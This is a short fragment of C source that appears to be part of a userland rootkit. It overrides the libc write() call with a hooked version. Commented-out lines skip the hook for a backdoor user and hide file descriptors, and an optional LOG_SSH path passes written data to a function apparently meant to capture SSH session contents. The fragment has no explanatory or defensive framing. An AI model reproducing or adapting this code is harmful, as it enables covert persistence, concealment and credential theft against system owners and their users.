ssize_t write(int fd, const void *buf, size_t n){
    hook(CWRITE);
    //if(is_bdusr()) return (ssize_t)call(CWRITE, fd, buf, n);

    /*if(hidden_fd(fd)){
        errno = EIO;
        return -1;
    }*/

    ssize_t o = (ssize_t)call(CWRITE, fd, buf, n);
#ifdef LOG_SSH
    return hijack_write_ssh(fd, buf, o);
#else
    return o;
#endif
}